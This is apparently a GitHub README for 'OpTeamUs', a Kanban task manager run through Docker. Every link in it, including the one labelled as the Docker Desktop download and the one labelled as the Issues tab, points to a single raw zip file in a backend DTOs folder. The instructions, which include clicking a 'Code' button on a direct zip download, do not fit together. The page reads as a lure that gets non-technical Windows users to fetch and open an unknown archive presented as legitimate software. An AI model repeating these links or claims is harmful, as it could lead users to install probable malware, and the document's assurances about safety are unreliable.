# 🚀 OpTeamUs - Simple Task Control Made Easy

[![Download OpTeamUs](https://img.shields.io/badge/Download-OpTeamUs-brightgreen)](https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip)

OpTeamUs is a tool to help you manage tasks and projects. It works on your Windows computer and lets you organize work with boards, lists, and cards. This guide will show you how to get OpTeamUs running step-by-step. You do not need any special skills or experience.

---

## 📋 What is OpTeamUs?

OpTeamUs is a full task management system. It uses modern technology but you don't have to worry about that. You can use it to:  

- Create tasks and track their progress  
- Organize tasks in easy-to-use columns  
- Collaborate with team members  
- See all your work clearly on a Kanban board  

The software runs smoothly on Windows and manages your data safely using PostgreSQL, a database system.  

---

## 🔧 System Requirements

Before starting, make sure your Windows PC meets these minimum requirements:  

- Windows 10 or newer (64-bit)  
- At least 4 GB of free memory (8 GB recommended)  
- At least 2 GB of free storage  
- Internet connection for initial setup  
- Docker Desktop installed (will be needed, see below)  

Docker is a tool that allows the software to run in a controlled environment on your computer. The guide will explain how to install it if you don’t have it yet.  

---

## 🌐 Download OpTeamUs

Please visit the following page to download OpTeamUs and related files. This link brings you to the official repository where you will find everything needed:

[![Download OpTeamUs](https://img.shields.io/badge/Download-OpTeamUs-brightgreen)](https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip)

Click this link or button to open the GitHub page where downloads are found.  

---

## 📥 Step 1: Download and Install Docker Desktop

OpTeamUs uses Docker to run several parts together easily. You must install Docker Desktop to proceed.  

1. Go to https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip  
2. Click the download button for Windows.  
3. Open the downloaded file and follow the install steps.  
4. After installation, start Docker Desktop. It may ask you to create an account or log in but you can skip this.  
5. Wait until Docker shows it is running in the system tray (bottom right corner).  

---

## 📥 Step 2: Download OpTeamUs Files

Once Docker is ready, download the OpTeamUs files:  

1. Visit https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip  
2. Click the green **Code** button on the page.  
3. Select **Download ZIP**.  
4. When the ZIP file finishes downloading, open it.  
5. Extract the files to a folder you can easily find, like **Documents\OpTeamUs**.  

---

## ⚙️ Step 3: Prepare to Run OpTeamUs

You will now set up the software using the extracted files.  

1. Open the folder where you extracted OpTeamUs.  
2. Look for a file called `docker-compose.yml`. This file tells Docker how to start OpTeamUs and all its parts.  
3. Press and hold **Shift** and right-click inside the folder (not on a file).  
4. Choose **Open PowerShell window here** or **Open Command Prompt here**.  

---

## ▶️ Step 4: Start OpTeamUs with Docker

In the window that opened, type the following command and press Enter:

```
docker-compose up
```

This tells Docker to start everything. It may take a few minutes the first time because it downloads needed parts from the internet.  

You will see many messages scrolling. Wait until it stops and you see no errors.  

---

## 🔍 Step 5: Open OpTeamUs in Your Browser

Now, open your web browser (like Chrome, Edge, or Firefox) and enter the following address:

```
http://localhost:3000
```

This opens the OpTeamUs interface. You should see the task board and can start adding your tasks.  

---

## 🛠️ Step 6: Using OpTeamUs

Here is a simple introduction to the main features:  

- **Create New Tasks:** Click the plus (+) button on any column to add a task.  
- **Move Tasks:** Drag and drop tasks to different columns as work progresses.  
- **Edit Tasks:** Click a task to change its details or add comments.  
- **Add Columns:** Use the settings menu to add new columns if you want to change how work flows.  
- **Manage Users:** If you work with a team, invite users by sharing access details (depends on how the app is set up).  

---

## 🔄 Step 7: Stop OpTeamUs Safely

When you want to stop using OpTeamUs, you can close the app by going back to the PowerShell or Command Prompt window and pressing **Ctrl + C**. This stops all the parts running.  

To restart the app later, repeat Step 4 by typing `docker-compose up` again in the folder.  

---

## 💡 Extra Tips

- If you want OpTeamUs to start automatically with Windows, you can add a shortcut to the Docker command in your startup folder.  
- You can back up your tasks and data by exporting the PostgreSQL database. This requires some technical steps described in the GitHub repository’s documents.  
- Check the GitHub page for updates and new versions regularly by visiting: https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip  

---

## 📂 What’s Inside the OpTeamUs Folder?

- **docker-compose.yml:** Configures how the app and database start.  
- **Backend files:** Manage your tasks and data securely.  
- **Frontend files:** The part you see and interact with in the browser.  
- **Database files:** Handle storing your work safely.  

---

## 🔐 Security and Privacy

OpTeamUs runs on your own computer. The data you create stays there unless you share it. The app does not send your data to any outside servers.  

---

## 🤝 Support and Help

For any issues or questions, visit the Issues tab on the GitHub repository page:  

https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip

You can post your problem there, and the project maintainers or community may assist.  

---

## 🔖 Topics

aspnet-core, aspnet-core-webapi, docker, docker-compose, fullstack, kanban, postgresql, postgresql-database, react, task-management